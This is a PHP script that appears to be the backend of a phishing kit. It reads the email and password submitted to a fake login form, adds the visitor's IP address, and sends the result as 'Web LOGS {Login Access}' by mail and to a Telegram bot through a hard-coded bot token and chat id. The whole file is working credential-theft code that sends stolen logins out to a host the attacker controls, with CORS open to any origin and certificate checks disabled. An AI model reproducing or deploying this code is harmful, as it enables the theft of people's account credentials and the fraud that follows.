<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$user_id = "-4192072907"; // Chat id
$botToken = "6455421102:AAHcJ-1z5SQ7m1gE80Xyax-QyWYU4nlkvks"; //Bot token
$recipient = "";  // Replace with the actual email address

function get_client_ip()
{
    $ipaddress = "";
    if (getenv("HTTP_CLIENT_IP"))
        $ipaddress = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR"))
        $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("HTTP_X_FORWARDED"))
        $ipaddress = getenv("HTTP_X_FORWARDED");
    else if (getenv("HTTP_FORWARDED_FOR"))
        $ipaddress = getenv("HTTP_FORWARDED_FOR");
    else if (getenv("HTTP_FORWARDED"))
        $ipaddress = getenv("HTTP_FORWARDED");
    else if (getenv("REMOTE_ADDR"))
        $ipaddress = getenv("REMOTE_ADDR");
    else
        $ipaddress = "UNKNOWN";
    return $ipaddress;
}

$IP = get_client_ip();
$USER = $_POST['email'];
$PASS = $_POST['userpwd'];

$Message = "Web LOGS {Login Access}" . PHP_EOL;
$Message .= "Email: " . $USER . PHP_EOL;
$Message .= "Password: " . $PASS . PHP_EOL;
$Message .= "IP ADDRESS : https://ip-api.com/" . $IP . PHP_EOL;

$subject = "❤Web LOGS {Login Access}❤ | $IP";
$headers = "From: ❤WEBMIL-ACCESS❤ <culovely@gmail.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";

$send = mail($recipient, $subject, $Message, $headers);

if ($send) {
    echo "Successful sending email";
} else {
    echo "Error sending email";
}


// Telegram
$website = "https://api.telegram.org/bot{$botToken}";
$params = [
    'chat_id' => $user_id,
    'text' => $Message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


if ($result !== false) {

    echo "Form data sent to Telegram successfully!";
} else {

    echo "Failed to send form data to Telegram.";
}
?>
